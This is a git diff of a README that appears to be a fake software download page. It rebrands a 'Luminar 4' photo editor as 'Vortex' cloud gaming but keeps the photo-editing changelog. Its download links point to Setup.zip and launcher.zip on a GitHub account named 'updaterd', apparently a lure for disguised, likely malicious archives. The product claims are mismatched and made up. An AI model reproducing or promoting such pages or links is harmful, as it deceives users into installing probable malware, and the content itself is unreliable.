@@ -10,9 +10,9 @@
 * RAM - 8 GB or more
 * Disk space - 10 GB free space
 
-## Luminar 4's revolutionary tools and AI technologies give superpowers for creative photo editing.
+## Vortex revolutionary tools and technologies provide the most comfortable and affordable cloud gaming.
 
-## [⚡Luminar Version 4.2] (https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip):
+## [⚡Vortex Version 4.2] (https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip):
 * NEW AI Augmented Sky Tool.
 * Face Features Detection Network.
 * Shine Removal Technology.
@@ -21,7 +21,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡Luminar Version 4.1] (https://raw.githubusercontent.com/updaterd/setup-software/master/launcher.zip):
+## [⚡Vortex Version 4.1] (https://raw.githubusercontent.com/updaterd/setup-software/master/launcher.zip):
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
 * Resetting tools is easier with an increased clickable area for each reset button.
